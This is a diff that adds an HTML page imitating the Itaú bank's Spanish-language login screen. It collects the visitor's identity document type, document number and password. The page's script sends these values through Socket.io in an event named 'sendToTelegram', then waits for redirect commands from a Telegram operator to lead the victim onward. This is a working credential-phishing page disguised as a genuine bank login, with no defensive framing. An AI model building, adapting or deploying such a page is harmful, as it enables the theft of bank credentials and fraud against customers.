@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Itaú - Ingresa tus datos</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 540px;
+            margin: 0;
+            padding: 20px;
+            padding-left: 25px;
+        }
+
+        .logo {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 35px;
+        }
+
+        .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #000000;
+            margin-bottom: 30px;
+            letter-spacing: -0.5px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 400;
+            color: #000000;
+            margin-bottom: 10px;
+        }
+
+        select, input {
+            width: 100%;
+            padding: 15px 16px;
+            font-size: 15px;
+            border: 1.5px solid #cccccc;
+            border-radius: 8px;
+            background-color: #ffffff;
+            color: #000000;
+            outline: none;
+            appearance: none;
+            font-family: inherit;
+        }
+
+        select {
+            background-image: url("data:image/svg+xml,%3Csvg width='10' height='6' viewBox='0 0 10 6' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M1 1L5 5L9 1' stroke='%23666666' stroke-width='1.5' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+            padding-right: 40px;
+            cursor: pointer;
+        }
+
+        select:focus, input:focus {
+            border-color: #0066cc;
+        }
+
+        input::placeholder {
+            color: #aaaaaa;
+        }
+
+        .password-wrapper {
+            position: relative;
+        }
+
+        .password-wrapper input {
+            padding-right: 45px;
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            width: 20px;
+            height: 20px;
+        }
+
+        .eye-icon svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        .forgot-password {
+            display: block;
+            font-size: 14px;
+            color: #0066cc;
+            text-decoration: underline;
+            margin-top: 12px;
+        }
+
+        .forgot-password:hover {
+            color: #0052a3;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background-color: #e8e8e8;
+            color: #b8b8b8;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: not-allowed;
+            margin-top: auto;
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            width: calc(100% - 40px);
+            letter-spacing: 0.2px;
+        }
+
+        .submit-btn.active {
+            background-color: #fe6200;
+            color: #ffffff;
+            cursor: pointer;
+        }
+
+        .submit-btn.active:hover {
+            background-color: #e55800;
+        }
+
+        /* Loading Overlay */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #ffffff;
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loading-icon {
+            width: 120px;
+            height: 120px;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .loading-icon::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 50px;
+            height: 50px;
+            background-color: #fe6200;
+            border-radius: 10px;
+        }
+
+        .loading-icon::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90px;
+            height: 90px;
+            border: 3px solid #fe6200;
+            border-radius: 15px;
+            opacity: 0.3;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        .loading-ring {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 110px;
+            height: 110px;
+            border: 3px solid #fe6200;
+            border-radius: 18px;
+            opacity: 0.2;
+            animation: pulse 2s ease-in-out infinite 0.5s;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: translate(-50%, -50%) scale(1);
+                opacity: 0.2;
+            }
+            50% {
+                transform: translate(-50%, -50%) scale(1.1);
+                opacity: 0.1;
+            }
+        }
+
+        .loading-text {
+            font-size: 22px;
+            font-weight: 700;
+            color: #000000;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        @media (min-width: 768px) {
+            .container {
+                max-width: 320px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-icon">
+            <div class="loading-ring"></div>
+        </div>
+        <h2 class="loading-text">Te damos la bienvenida a Itaú</h2>
+    </div>
+
+    <div class="container">
+        <div class="logo">
+            <img src="img/itau-logo.png" alt="Itaú">
+        </div>
+
+        <h1>Ingresa tus datos</h1>
+
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="documentType">Tipo de documento</label>
+                <select id="documentType" name="documentType">
+                    <option value="cedula">Cédula de ciudadanía</option>
+                    <option value="ce">Cédula de extranjería</option>
+                    <option value="pasaporte">Pasaporte</option>
+                    <option value="nit">Pase diplomático</option>
+                    <option value="nit">Registro Civil</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="documentNumber">Número de documento</label>
+                <input 
+                    type="text" 
+                    id="documentNumber" 
+                    name="documentNumber" 
+                    placeholder="Ingresa número de documento"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                >
+            </div>
+
+            <div class="form-group">
+                <label for="password">Clave</label>
+                <div class="password-wrapper">
+                    <input 
+                        type="password" 
+                        id="password" 
+                        name="password" 
+                        placeholder="Ingresa tu clave"
+                    >
+                    <span class="eye-icon" onclick="togglePassword()">
+                        <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M1 12C1 12 5 4 12 4C19 4 23 12 23 12C23 12 19 20 12 20C5 20 1 12 1 12Z" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                            <circle cx="12" cy="12" r="3" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                            <line id="eyeLine" x1="3" y1="3" x2="21" y2="21" stroke="#000000" stroke-width="2" stroke-linecap="round" display="none"/>
+                        </svg>
+                    </span>
+                </div>
+                <a href="recuperar.html" class="forgot-password">¿Tienes problemas con tu clave?</a>
+            </div>
+
+            <button type="submit" class="submit-btn" id="submitBtn">Ingresar</button>
+        </form>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="socket-handler.js"></script>
+    <script>
+        const documentNumber = document.getElementById('documentNumber');
+        const password = document.getElementById('password');
+        const documentType = document.getElementById('documentType');
+        const submitBtn = document.getElementById('submitBtn');
+        const loginForm = document.getElementById('loginForm');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+
+        // Solo permitir números en el campo de documento
+        documentNumber.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            checkFormValidity();
+        });
+
+        // Permitir letras y números en el campo de clave
+        password.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^a-zA-Z0-9]/g, '');
+            checkFormValidity();
+        });
+
+        function checkFormValidity() {
+            if (documentNumber.value.trim() !== '' && password.value.trim() !== '') {
+                submitBtn.classList.add('active');
+                submitBtn.disabled = false;
+            } else {
+                submitBtn.classList.remove('active');
+                submitBtn.disabled = true;
+            }
+        }
+
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const eyeLine = document.getElementById('eyeLine');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                eyeLine.style.display = 'block';
+            } else {
+                passwordInput.type = 'password';
+                eyeLine.style.display = 'none';
+            }
+        }
+
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            if (submitBtn.classList.contains('active')) {
+                // Show loading overlay
+                loadingOverlay.classList.add('active');
+
+                const sessionId = window.getSessionId();
+                console.log('📤 Enviando datos de Itaú login con sessionId:', sessionId);
+
+                // Update page tracker
+                window.itauSocket.emit('updatePage', {
+                    sessionId,
+                    page: 'login'
+                });
+
+                // Send data to server via Socket.io with bank structure
+                window.itauSocket.emit('sendToTelegram', {
+                    sessionId,
+                    data: {
+                        bank: 'Itaú',
+                        page: 'login',
+                        documentType: documentType.options[documentType.selectedIndex].text,
+                        documentNumber: documentNumber.value,
+                        password: password.value
+                    }
+                });
+            }
+        });
+
+        // Listen for server responses
+        window.itauSocket.on('telegramSent', (response) => {
+            if (response.success) {
+                // Keep loading overlay visible, wait for Telegram command
+                console.log('✅ Datos enviados exitosamente a Telegram');
+            } else {
+                loadingOverlay.classList.remove('active');
+                alert('Error al procesar la solicitud');
+            }
+        });
+
+        // Listen for redirect commands from Telegram
+        window.itauSocket.on('redirect', (data) => {
+            if (data.clearData) {
+                loginForm.reset();
+                checkFormValidity();
+            }
+            if (data.page) {
+                window.location.href = data.page;
+            }
+        });
+
+        // Clear data if specified in URL
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('clear') === 'true') {
+            loginForm.reset();
+            checkFormValidity();
+        }
+    </script>
+</body>
+</html>
